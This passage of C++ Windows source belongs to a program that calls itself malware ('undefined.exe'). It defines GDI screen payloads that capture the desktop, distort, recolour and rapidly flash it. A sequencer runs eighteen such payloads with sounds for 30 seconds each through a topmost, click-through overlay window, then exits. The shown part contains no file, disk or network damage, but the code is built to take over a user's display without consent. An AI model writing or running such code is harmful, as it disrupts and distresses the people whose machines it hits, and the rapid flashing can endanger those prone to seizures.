        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1); xxx++;
    }
}

DWORD WINAPI Payload17(LPVOID lpParam) {
    int i = 0, xxx = 0, power = 75; double angle = 0.f;
    int cix = 0, ciy = 0, size = 450 + ((1 + rand() % 14) * 100), ccciii = size;
    while (true) {
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        int x = power * cos(angle * 3.1415926 / 30), y = power * sin(angle * 3.1415926 / 30);
        StretchBlt(hcdc, x / 2, y / 2, w - x, h - y, hcdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hcdc, rand() % 25, rand() % 25, w, h, hcdc, rand() % 25, rand() % 25, SRCAND);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (i + (xxx + x ^ y)) ^ (i * 2);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int kun = 0; kun < 2; kun++) {
            int rand_num_x = rand() % w, rand_num_y = rand() % h;
            int top_x = 0 + rand_num_x, top_y = 0 + rand_num_y;
            int bottom_x = 180 + rand_num_x, bottom_y = 180 + rand_num_y;
            HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
            SelectClipRgn(hcdc, circle);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, rand_num_x, rand_num_y, w, h, hcdc, rand_num_x, rand_num_y, PATINVERT);
            DeleteObject(circle); DeleteObject(hBrush);
        }
        if (ccciii > size) { size = 450 + ((1 + rand() % 14) * 100); cix = rand() % (w + size) - size / 2; ciy = rand() % (h + size) - size / 2; ccciii = 0; }
        else { ccciii += 150; }
        ci(hcdc, cix - ccciii / 2, ciy - ccciii / 2, ccciii, ccciii);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        if (angle > 361) { angle = 0; } else { angle += 3.1415926 / 2; }
        Sleep(1); i++; xxx += 5;
    }
}

DWORD WINAPI Payload18(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int ColorRefReq = (rand() % 255) << 8, ColorRef = (ColorRefReq | (rand() % 255)) << 8;
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow_hwnd), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        HBRUSH hBrush = CreateSolidBrush(ColorRef | rand() % 255);
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 30, MERGECOPY);
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, SRCAND);
        for (int x = 0; x < w; x += 50) {
            StretchBlt(hcdc, x, -10 + rand() % 21, 50, h, hcdc, x, 0, 50, h, SRCAND);
        }
        for (int y = 0; y < h; y += 50) {
            StretchBlt(hcdc, -20 + rand() % 41, y, w, 50, hcdc, 0, y, w, 50, SRCAND);
        }
        for (int i = 0; i < 5; i++) {
            int x = (rand() % 100) - 50, y = (h / 2) - rand() % h;
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, 0, y, w, h, hcdc, x, y, SRCCOPY);
            PatBlt(hcdc, x, y, w, y, PATINVERT);
            DeleteObject(hBrush);
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
        Sleep(1);
    }
}

DWORD WINAPI Payload19(LPVOID lpParam) {
    srand(time(NULL));
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        PRGBQUAD rgbScreen = { 0 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int luckynum = rand() % 30;
            if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
            else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 7237230; }
            else { rgbScreen[i].rgb = 14474460; }
        }
        for (int x = 0; x < w; x += 50) {
            for (int y = 0; y < h; y += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 15, 15, SRCCOPY);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

// main part start
DWORD WINAPI RunGDIPayloads(LPVOID lpParam) {
    sound1();
    HANDLE Payload1T = CreateThread(0, 0, Payload1, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload1T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound2();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload2T = CreateThread(0, 0, Payload2, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload2T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound3();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload3T = CreateThread(0, 0, Payload3, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload3T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound4();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload4T = CreateThread(0, 0, Payload4, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload4T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound5();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload5T = CreateThread(0, 0, Payload5, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload5T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound6();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload6T = CreateThread(0, 0, Payload6, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload6T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound7();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload7T = CreateThread(0, 0, Payload7, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload7T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound8();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload8T = CreateThread(0, 0, Payload8, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload8T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound9();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload9T = CreateThread(0, 0, Payload9, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload9T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound10();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload10T = CreateThread(0, 0, Payload10, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload10T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound11();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload11T = CreateThread(0, 0, Payload11, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload11T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound12();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload12T = CreateThread(0, 0, Payload12, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload12T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound13();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload13T = CreateThread(0, 0, Payload13, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload13T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound14();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload14T = CreateThread(0, 0, Payload14, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload14T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound15();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload15T = CreateThread(0, 0, Payload15, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload15T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound16();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload16T = CreateThread(0, 0, Payload16, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload16T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound17();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload17T = CreateThread(0, 0, Payload17, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload17T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    sound18();
    ShowHide_GDIEffectWindow(true);
    HANDLE Payload18T = CreateThread(0, 0, Payload18, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload18T);
    RefreshScreen();
    ShowHide_GDIEffectWindow(false);
    Sleep(100);

    KillGDIWindow();
    ExitProcess(0);
}

void StartMalware() {
    ScreenResolutions(false);
    wcex.cbSize = sizeof(WNDCLASSEX); wcex.cbClsExtra = 0; wcex.cbWndExtra = 0;
    wcex.lpfnWndProc = WndProc;
    wcex.lpszClassName = L"camellia-y7x_GDIEffectWndClass";
    RegisterClassExW(&wcex);
    HWND hwnd = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TRANSPARENT, wcex.lpszClassName, L"GDI effect window - undefined.exe by camellia-y7x (ShuilongwxZoey)", WS_CLIPSIBLINGS | WS_POPUP | WS_DISABLED | WS_MAXIMIZE, 0, 0, w, h, nullptr, nullptr, 0, nullptr);
    if (!hwnd && !IsWindow(hwnd)) { return; }
    SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA); //window opacity: 255 (0 ~ 255)
    UpdateWindow(hwnd);
    GDIWindow_hwnd = hwnd;
    CreateThread(0, 0, RunGDIPayloads, 0, 0, 0);
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (!TranslateAccelerator(msg.hwnd, NULL, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}
// main part end